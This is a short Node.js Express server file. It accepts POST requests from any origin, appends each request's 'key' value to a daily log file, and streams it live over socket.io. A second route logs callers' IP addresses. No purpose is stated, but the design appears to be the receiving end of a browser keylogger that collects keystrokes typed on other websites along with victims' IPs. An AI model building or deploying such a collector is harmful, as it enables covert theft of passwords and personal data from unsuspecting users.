const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const server = require('http').Server(app);
const io = require('socket.io')(server);
const  requestIp = require('request-ip');
// Enable CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});
app.use(requestIp.mw())
app.use(bodyParser.json());

app.post('/', (req, res) => {
    const value = req.body || req;

    fs.appendFile(`${new Date().getDate()}${new Date().getMonth()}${new Date().getFullYear()}.txt`, value.key, (err) => {
        if (err) throw err;
    });
    io.emit('log', value.key);
    res.sendStatus(200);
});
app.get('/ip/:ip/:date', (req, res)=>{
    const ip = req.clientIp;
    const date = req.params.date;
    fs.appendFile(`${new Date().getDate()}${new Date().getMonth()}${new Date().getFullYear()}.txt`,
        `\n##${ip} ##${date}\n`
        , (err) => {
        if (err) throw err;
    });
    io.emit('ip', {ip,date});
    res.sendStatus(200);
})

server.listen(3000, () => {
    console.log('3000');
});